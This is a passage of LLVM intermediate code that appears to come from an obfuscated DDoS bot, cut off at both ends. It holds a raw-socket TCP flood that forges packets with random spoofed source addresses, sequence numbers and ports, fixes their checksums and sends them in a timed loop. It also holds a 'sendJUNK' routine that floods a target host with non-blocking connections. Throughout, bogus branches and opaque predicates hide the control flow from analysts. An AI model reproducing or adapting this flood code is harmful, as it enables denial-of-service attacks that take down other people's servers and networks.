  store i32 0, i32* %33, align 4
  br label %514

; <label>:514:                                    ; preds = %originalBBpart289, %598, %489
  %515 = load i32, i32* @x.73
  %516 = load i32, i32* @y.74
  %517 = sub i32 %515, 1
  %518 = mul i32 %515, %517
  %519 = urem i32 %518, 2
  %520 = icmp eq i32 %519, 0
  %521 = icmp slt i32 %516, 10
  %522 = or i1 %520, %521
  br i1 %522, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %514
  %523 = load i32, i32* @x.73
  %524 = load i32, i32* @y.74
  %525 = sub i32 %523, 1
  %526 = mul i32 %523, %525
  %527 = urem i32 %526, 2
  %528 = icmp eq i32 %527, 0
  %529 = icmp slt i32 %524, 10
  %530 = or i1 %528, %529
  br i1 %530, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br label %531

; <label>:531:                                    ; preds = %originalBBpart274
  %532 = load i32, i32* @x.73
  %533 = load i32, i32* @y.74
  %534 = sub i32 %532, 1
  %535 = mul i32 %532, %534
  %536 = urem i32 %535, 2
  %537 = icmp eq i32 %536, 0
  %538 = icmp slt i32 %533, 10
  %539 = or i1 %537, %538
  br i1 %539, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %531
  %540 = load i32, i32* %25, align 4
  %541 = bitcast %struct.sockaddr_in* %24 to %struct.sockaddr*
  %542 = call i64 @sendto(i32 %540, i8* %185, i64 %183, i32 0, %struct.sockaddr* %541, i32 16)
  %543 = load i32, i32* %27, align 4
  %544 = call i32 @getRandomIP(i32 %543)
  %545 = call i32 @htonl(i32 %544) #13
  %546 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %547 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %546, i32 0, i32 8
  store i32 %545, i32* %547, align 4
  %548 = call i32 @rand_cmwc()
  %549 = trunc i32 %548 to i16
  %550 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %551 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %550, i32 0, i32 3
  store i16 %549, i16* %551, align 4
  %552 = call i32 @rand_cmwc()
  %553 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %554 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %553, i32 0, i32 0
  %555 = bitcast %union.anon.0* %554 to %struct.anon.1*
  %556 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %555, i32 0, i32 2
  store i32 %552, i32* %556, align 4
  %557 = call i32 @rand_cmwc()
  %558 = trunc i32 %557 to i16
  %559 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %560 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %559, i32 0, i32 0
  %561 = bitcast %union.anon.0* %560 to %struct.anon.1*
  %562 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %561, i32 0, i32 0
  store i16 %558, i16* %562, align 4
  %563 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %564 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %563, i32 0, i32 0
  %565 = bitcast %union.anon.0* %564 to %struct.anon.1*
  %566 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %565, i32 0, i32 6
  store i16 0, i16* %566, align 4
  %567 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %568 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %569 = call zeroext i16 @tcpcsum(%struct.iphdr* %567, %struct.tcphdr* %568)
  %570 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %571 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %570, i32 0, i32 0
  %572 = bitcast %union.anon.0* %571 to %struct.anon.1*
  %573 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %572, i32 0, i32 6
  store i16 %569, i16* %573, align 4
  %574 = bitcast i8* %185 to i16*
  %575 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %576 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %575, i32 0, i32 2
  %577 = load i16, i16* %576, align 2
  %578 = zext i16 %577 to i32
  %579 = call zeroext i16 @csum(i16* %574, i32 %578)
  %580 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %581 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %580, i32 0, i32 7
  store i16 %579, i16* %581, align 2
  %582 = load i32, i32* %33, align 4
  %583 = load i32, i32* %23, align 4
  %584 = icmp eq i32 %582, %583
  %585 = load i32, i32* @x.73
  %586 = load i32, i32* @y.74
  %587 = sub i32 %585, 1
  %588 = mul i32 %585, %587
  %589 = urem i32 %588, 2
  %590 = icmp eq i32 %589, 0
  %591 = icmp slt i32 %586, 10
  %592 = or i1 %590, %591
  br i1 %592, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br i1 %584, label %593, label %599

; <label>:593:                                    ; preds = %originalBBpart278
  %594 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %595 = load i32, i32* %32, align 4
  %596 = icmp sgt i32 %594, %595
  br i1 %596, label %597, label %598

; <label>:597:                                    ; preds = %593
  br label %618

; <label>:598:                                    ; preds = %593
  store i32 0, i32* %33, align 4
  br label %514

; <label>:599:                                    ; preds = %originalBBpart278
  %600 = load i32, i32* @x.73
  %601 = load i32, i32* @y.74
  %602 = sub i32 %600, 1
  %603 = mul i32 %600, %602
  %604 = urem i32 %603, 2
  %605 = icmp eq i32 %604, 0
  %606 = icmp slt i32 %601, 10
  %607 = or i1 %605, %606
  br i1 %607, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %599
  %608 = load i32, i32* %33, align 4
  %609 = add i32 %608, 1
  store i32 %609, i32* %33, align 4
  %610 = load i32, i32* @x.73
  %611 = load i32, i32* @y.74
  %612 = sub i32 %610, 1
  %613 = mul i32 %610, %612
  %614 = urem i32 %613, 2
  %615 = icmp eq i32 %614, 0
  %616 = icmp slt i32 %611, 10
  %617 = or i1 %615, %616
  br i1 %617, label %originalBBpart289, label %originalBB80alteredBB

originalBBpart289:                                ; preds = %originalBB80
  br label %514

; <label>:618:                                    ; preds = %597
  %619 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %619)
  br label %620

; <label>:620:                                    ; preds = %618, %originalBBpart224, %originalBBpart216, %originalBBpart28
  %621 = load i32, i32* @x.73
  %622 = load i32, i32* @y.74
  %623 = sub i32 %621, 1
  %624 = mul i32 %621, %623
  %625 = urem i32 %624, 2
  %626 = icmp eq i32 %625, 0
  %627 = icmp slt i32 %622, 10
  %628 = or i1 %626, %627
  br i1 %628, label %originalBB91, label %originalBB91alteredBB

originalBB91:                                     ; preds = %originalBB91alteredBB, %620
  %629 = load i32, i32* @x.73
  %630 = load i32, i32* @y.74
  %631 = sub i32 %629, 1
  %632 = mul i32 %629, %631
  %633 = urem i32 %632, 2
  %634 = icmp eq i32 %633, 0
  %635 = icmp slt i32 %630, 10
  %636 = or i1 %634, %635
  br i1 %636, label %originalBBpart293, label %originalBB91alteredBB

originalBBpart293:                                ; preds = %originalBB91
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %7
  %637 = alloca i8*, align 8
  %638 = alloca i32, align 4
  %639 = alloca i32, align 4
  %640 = alloca i8*, align 8
  %641 = alloca i32, align 4
  %642 = alloca i32, align 4
  %643 = alloca i32, align 4
  %644 = alloca i32, align 4
  %645 = alloca %struct.sockaddr_in, align 4
  %646 = alloca i32, align 4
  %647 = alloca i32, align 4
  %648 = alloca i32, align 4
  %649 = alloca i8*, align 8
  %650 = alloca %struct.iphdr*, align 8
  %651 = alloca %struct.tcphdr*, align 8
  %652 = alloca i8*, align 8
  %653 = alloca i32, align 4
  %654 = alloca i32, align 4
  store i8* %0, i8** %637, align 8
  store i32 %1, i32* %638, align 4
  store i32 %2, i32* %639, align 4
  store i8* %3, i8** %640, align 8
  store i32 %4, i32* %641, align 4
  store i32 %5, i32* %642, align 4
  store i32 %6, i32* %643, align 4
  %655 = load i32, i32* %642, align 4
  store i32 %655, i32* %644, align 4
  %656 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %645, i32 0, i32 0
  store i16 2, i16* %656, align 4
  %657 = load i32, i32* %638, align 4
  %658 = icmp eq i32 %657, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %50
  %659 = load i32, i32* %17, align 4
  %660 = trunc i32 %659 to i16
  %661 = call zeroext i16 @htons(i16 zeroext %660) #13
  %662 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %661, i16* %662, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %76
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %93
  %663 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 3
  %664 = getelementptr inbounds [8 x i8], [8 x i8]* %663, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %664, i8 0, i64 8, i32 4, i1 false)
  %665 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %665, i32* %25, align 4
  %666 = load i32, i32* %25, align 4
  %667 = icmp ne i32 %666, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %115
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %132
  store i32 1, i32* %26, align 4
  %668 = load i32, i32* %25, align 4
  %669 = bitcast i32* %26 to i8*
  %670 = call i32 @setsockopt(i32 %668, i32 0, i32 3, i8* %669, i32 4) #2
  %671 = icmp slt i32 %670, 0
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %153
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %263
  %672 = load i8*, i8** %19, align 8
  %673 = call i8* @strtok(i8* %672, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %673, i8** %31, align 8
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %289
  %674 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %675 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %674, i32 0, i32 0
  %676 = bitcast %union.anon.0* %675 to %struct.anon.1*
  %677 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %676, i32 0, i32 4
  %678 = load i16, i16* %677, align 4
  %_ = sub i16 0, %678
  %gen = add i16 %_, -513
  %_31 = sub i16 %678, -513
  %gen32 = mul i16 %_31, -513
  %_33 = sub i16 0, %678
  %gen34 = add i16 %_33, -513
  %_35 = shl i16 %678, -513
  %_36 = sub i16 0, %678
  %gen37 = add i16 %_36, -513
  %_38 = sub i16 %678, -513
  %gen39 = mul i16 %_38, -513
  %679 = and i16 %678, -513
  %_40 = sub i16 0, %679
  %gen41 = add i16 %_40, 512
  %_42 = sub i16 %679, 512
  %gen43 = mul i16 %_42, 512
  %_44 = shl i16 %679, 512
  %680 = or i16 %679, 512
  store i16 %680, i16* %677, align 4
  br label %originalBB30

originalBB48alteredBB:                            ; preds = %originalBB48, %325
  %681 = load i8*, i8** %31, align 8
  %682 = call i32 @strcmp(i8* %681, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.87, i32 0, i32 0)) #10
  %683 = icmp ne i32 %682, 0
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %377
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %396
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %413
  br label %originalBB60

originalBB64alteredBB:                            ; preds = %originalBB64, %432
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %466
  %684 = call i32 @rand_cmwc()
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %514
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %531
  %685 = load i32, i32* %25, align 4
  %686 = bitcast %struct.sockaddr_in* %24 to %struct.sockaddr*
  %687 = call i64 @sendto(i32 %685, i8* %185, i64 %183, i32 0, %struct.sockaddr* %686, i32 16)
  %688 = load i32, i32* %27, align 4
  %689 = call i32 @getRandomIP(i32 %688)
  %690 = call i32 @htonl(i32 %689) #13
  %691 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %692 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %691, i32 0, i32 8
  store i32 %690, i32* %692, align 4
  %693 = call i32 @rand_cmwc()
  %694 = trunc i32 %693 to i16
  %695 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %696 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %695, i32 0, i32 3
  store i16 %694, i16* %696, align 4
  %697 = call i32 @rand_cmwc()
  %698 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %699 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %698, i32 0, i32 0
  %700 = bitcast %union.anon.0* %699 to %struct.anon.1*
  %701 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %700, i32 0, i32 2
  store i32 %697, i32* %701, align 4
  %702 = call i32 @rand_cmwc()
  %703 = trunc i32 %702 to i16
  %704 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %705 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %704, i32 0, i32 0
  %706 = bitcast %union.anon.0* %705 to %struct.anon.1*
  %707 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %706, i32 0, i32 0
  store i16 %703, i16* %707, align 4
  %708 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %709 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %708, i32 0, i32 0
  %710 = bitcast %union.anon.0* %709 to %struct.anon.1*
  %711 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %710, i32 0, i32 6
  store i16 0, i16* %711, align 4
  %712 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %713 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %714 = call zeroext i16 @tcpcsum(%struct.iphdr* %712, %struct.tcphdr* %713)
  %715 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %716 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %715, i32 0, i32 0
  %717 = bitcast %union.anon.0* %716 to %struct.anon.1*
  %718 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %717, i32 0, i32 6
  store i16 %714, i16* %718, align 4
  %719 = bitcast i8* %185 to i16*
  %720 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %721 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %720, i32 0, i32 2
  %722 = load i16, i16* %721, align 2
  %723 = zext i16 %722 to i32
  %724 = call zeroext i16 @csum(i16* %719, i32 %723)
  %725 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %726 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %725, i32 0, i32 7
  store i16 %724, i16* %726, align 2
  %727 = load i32, i32* %33, align 4
  %728 = load i32, i32* %23, align 4
  %729 = icmp eq i32 %727, %728
  br label %originalBB76

originalBB80alteredBB:                            ; preds = %originalBB80, %599
  %730 = load i32, i32* %33, align 4
  %_81 = shl i32 %730, 1
  %_82 = shl i32 %730, 1
  %_83 = shl i32 %730, 1
  %_84 = sub i32 %730, 1
  %gen85 = mul i32 %_84, 1
  %_86 = sub i32 0, %730
  %gen87 = add i32 %_86, 1
  %731 = add i32 %730, 1
  store i32 %731, i32* %33, align 4
  br label %originalBB80

originalBB91alteredBB:                            ; preds = %originalBB91, %620
  br label %originalBB91
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) #0 {
  %4 = load i32, i32* @x.75
  %5 = load i32, i32* @y.76
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i8*, align 8
  %19 = alloca %struct.__sigset_t, align 8
  %20 = alloca %struct.timeval, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i32 %1, i32* %13, align 4
  store i32 %2, i32* %14, align 4
  %28 = call i32 @getdtablesize() #2
  %29 = sdiv i32 %28, 2
  store i32 %29, i32* %15, align 4
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %30, align 4
  %31 = load i32, i32* %13, align 4
  %32 = trunc i32 %31 to i16
  %33 = call zeroext i16 @htons(i16 zeroext %32) #13
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  %35 = load i8*, i8** %12, align 8
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %37 = call i32 @getHost(i8* %35, %struct.in_addr* %36)
  %38 = icmp ne i32 %37, 0
  %39 = load i32, i32* @x.75
  %40 = load i32, i32* @y.76
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %38, label %47, label %48

; <label>:47:                                     ; preds = %originalBBpart2
  br label %354

; <label>:48:                                     ; preds = %originalBBpart2
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %50 = getelementptr inbounds [8 x i8], [8 x i8]* %49, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 8, i32 4, i1 false)
  %51 = load i32, i32* %15, align 4
  %52 = zext i32 %51 to i64
  %53 = call i8* @llvm.stacksave()
  store i8* %53, i8** %18, align 8
  %54 = alloca %struct.state_t, i64 %52, align 16
  %55 = bitcast %struct.state_t* %54 to i8*
  %56 = load i32, i32* %15, align 4
  %57 = sext i32 %56 to i64
  %58 = mul i64 %57, 5
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 %58, i32 16, i1 false)
  %59 = call noalias i8* @malloc(i64 1024) #2
  store i8* %59, i8** %24, align 8
  %60 = load i8*, i8** %24, align 8
  call void @llvm.memset.p0i8.i64(i8* %60, i8 0, i64 1024, i32 1, i1 false)
  %61 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %62 = load i32, i32* %14, align 4
  %63 = add nsw i32 %61, %62
  store i32 %63, i32* %25, align 4
  br label %64

; <label>:64:                                     ; preds = %originalBBpart241, %48
  %65 = load i32, i32* @x.75
  %66 = load i32, i32* @y.76
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBB5, label %originalBB5alteredBB

originalBB5:                                      ; preds = %originalBB5alteredBB, %64
  %73 = load i32, i32* %25, align 4
  %74 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %75 = icmp sgt i32 %73, %74
  %76 = load i32, i32* @x.75
  %77 = load i32, i32* @y.76
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart27, label %originalBB5alteredBB

originalBBpart27:                                 ; preds = %originalBB5
  br i1 %75, label %84, label %352

; <label>:84:                                     ; preds = %originalBBpart27
  store i32 0, i32* %16, align 4
  br label %85

; <label>:85:                                     ; preds = %originalBBpart237, %84
  %86 = load i32, i32* %16, align 4
  %87 = load i32, i32* %15, align 4
  %88 = icmp slt i32 %86, %87
  br i1 %88, label %89, label %335

; <label>:89:                                     ; preds = %85
  %90 = load i32, i32* %16, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %91
  %93 = getelementptr inbounds %struct.state_t, %struct.state_t* %92, i32 0, i32 1
  %94 = load i8, i8* %93, align 4
  %95 = zext i8 %94 to i32
  switch i32 %95, label %299 [
    i32 0, label %96
    i32 1, label %140
    i32 2, label %257
  ]

; <label>:96:                                     ; preds = %89
  %97 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %98 = load i32, i32* %16, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %99
  %101 = getelementptr inbounds %struct.state_t, %struct.state_t* %100, i32 0, i32 0
  store i32 %97, i32* %101, align 8
  %102 = load i32, i32* %16, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %103
  %105 = getelementptr inbounds %struct.state_t, %struct.state_t* %104, i32 0, i32 0
  %106 = load i32, i32* %105, align 8
  %107 = load i32, i32* %16, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %108
  %110 = getelementptr inbounds %struct.state_t, %struct.state_t* %109, i32 0, i32 0
  %111 = load i32, i32* %110, align 8
  %112 = call i32 (i32, i32, ...) @fcntl(i32 %111, i32 3, i8* null)
  %113 = or i32 %112, 2048
  %114 = call i32 (i32, i32, ...) @fcntl(i32 %106, i32 4, i32 %113)
  %115 = load i32, i32* %16, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %116
  %118 = getelementptr inbounds %struct.state_t, %struct.state_t* %117, i32 0, i32 0
  %119 = load i32, i32* %118, align 8
  %120 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %121 = call i32 @connect(i32 %119, %struct.sockaddr* %120, i32 16)
  %122 = icmp ne i32 %121, -1
  br i1 %122, label %127, label %123

; <label>:123:                                    ; preds = %96
  %124 = call i32* @__errno_location() #13
  %125 = load i32, i32* %124, align 4
  %126 = icmp ne i32 %125, 115
  br i1 %126, label %127, label %134

; <label>:127:                                    ; preds = %123, %96
  %128 = load i32, i32* %16, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %129
  %131 = getelementptr inbounds %struct.state_t, %struct.state_t* %130, i32 0, i32 0
  %132 = load i32, i32* %131, align 8
  %133 = call i32 @close(i32 %132)
  br label %139

; <label>:134:                                    ; preds = %123
  %135 = load i32, i32* %16, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %136
  %138 = getelementptr inbounds %struct.state_t, %struct.state_t* %137, i32 0, i32 1
  store i8 1, i8* %138, align 4
  br label %139

; <label>:139:                                    ; preds = %134, %127
  br label %299

; <label>:140:                                    ; preds = %89
  br label %141

; <label>:141:                                    ; preds = %140
  %142 = load i32, i32* @x.75
  %143 = load i32, i32* @y.76
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBB9, label %originalBB9alteredBB

originalBB9:                                      ; preds = %originalBB9alteredBB, %141
  %150 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %19, i32 0, i32 0
  %151 = getelementptr inbounds [16 x i64], [16 x i64]* %150, i64 0, i64 0
  %152 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %151) #2, !srcloc !6
  %153 = extractvalue { i64, i64* } %152, 0
  %154 = extractvalue { i64, i64* } %152, 1
  %155 = trunc i64 %153 to i32
  store i32 %155, i32* %26, align 4
  %156 = ptrtoint i64* %154 to i64
  %157 = trunc i64 %156 to i32
  store i32 %157, i32* %27, align 4
  %158 = load i32, i32* @x.75
  %159 = load i32, i32* @y.76
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBBpart211, label %originalBB9alteredBB

originalBBpart211:                                ; preds = %originalBB9
  br label %166

; <label>:166:                                    ; preds = %originalBBpart211
  br label %167

; <label>:167:                                    ; preds = %166
  %168 = load i32, i32* %16, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %169
  %171 = getelementptr inbounds %struct.state_t, %struct.state_t* %170, i32 0, i32 0
  %172 = load i32, i32* %171, align 8
  %173 = srem i32 %172, 64
  %174 = zext i32 %173 to i64
  %175 = shl i64 1, %174
  %176 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %19, i32 0, i32 0
  %177 = load i32, i32* %16, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %178
  %180 = getelementptr inbounds %struct.state_t, %struct.state_t* %179, i32 0, i32 0
  %181 = load i32, i32* %180, align 8
  %182 = sdiv i32 %181, 64
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds [16 x i64], [16 x i64]* %176, i64 0, i64 %183
  %185 = load i64, i64* %184, align 8
  %186 = or i64 %185, %175
  store i64 %186, i64* %184, align 8
  %187 = getelementptr inbounds %struct.timeval, %struct.timeval* %20, i32 0, i32 0
  store i64 0, i64* %187, align 8
  %188 = getelementptr inbounds %struct.timeval, %struct.timeval* %20, i32 0, i32 1
  store i64 10000, i64* %188, align 8
  %189 = load i32, i32* %16, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %190
  %192 = getelementptr inbounds %struct.state_t, %struct.state_t* %191, i32 0, i32 0
  %193 = load i32, i32* %192, align 8
  %194 = add nsw i32 %193, 1
  %195 = call i32 @select(i32 %194, %struct.__sigset_t* null, %struct.__sigset_t* %19, %struct.__sigset_t* null, %struct.timeval* %20)
  store i32 %195, i32* %23, align 4
  %196 = load i32, i32* %23, align 4
  %197 = icmp eq i32 %196, 1
  br i1 %197, label %198, label %241

; <label>:198:                                    ; preds = %167
  %199 = load i32, i32* @x.75
  %200 = load i32, i32* @y.76
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %198
  store i32 4, i32* %21, align 4
  %207 = load i32, i32* %16, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %208
  %210 = getelementptr inbounds %struct.state_t, %struct.state_t* %209, i32 0, i32 0
  %211 = load i32, i32* %210, align 8
  %212 = bitcast i32* %22 to i8*
  %213 = call i32 @getsockopt(i32 %211, i32 1, i32 4, i8* %212, i32* %21) #2
  %214 = load i32, i32* %22, align 4
  %215 = icmp ne i32 %214, 0
  %216 = load i32, i32* @x.75
  %217 = load i32, i32* @y.76
  %218 = sub i32 %216, 1
  %219 = mul i32 %216, %218
  %220 = urem i32 %219, 2
  %221 = icmp eq i32 %220, 0
  %222 = icmp slt i32 %217, 10
  %223 = or i1 %221, %222
  br i1 %223, label %originalBBpart215, label %originalBB13alteredBB

originalBBpart215:                                ; preds = %originalBB13
  br i1 %215, label %224, label %235

; <label>:224:                                    ; preds = %originalBBpart215
  %225 = load i32, i32* %16, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %226
  %228 = getelementptr inbounds %struct.state_t, %struct.state_t* %227, i32 0, i32 0
  %229 = load i32, i32* %228, align 8
  %230 = call i32 @close(i32 %229)
  %231 = load i32, i32* %16, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %232
  %234 = getelementptr inbounds %struct.state_t, %struct.state_t* %233, i32 0, i32 1
  store i8 0, i8* %234, align 4
  br label %240

; <label>:235:                                    ; preds = %originalBBpart215
  %236 = load i32, i32* %16, align 4
  %237 = sext i32 %236 to i64
  %238 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %237
  %239 = getelementptr inbounds %struct.state_t, %struct.state_t* %238, i32 0, i32 1
  store i8 2, i8* %239, align 4
  br label %240

; <label>:240:                                    ; preds = %235, %224
  br label %256

; <label>:241:                                    ; preds = %167
  %242 = load i32, i32* %23, align 4
  %243 = icmp eq i32 %242, -1
  br i1 %243, label %244, label %255

; <label>:244:                                    ; preds = %241
  %245 = load i32, i32* %16, align 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %246
  %248 = getelementptr inbounds %struct.state_t, %struct.state_t* %247, i32 0, i32 0
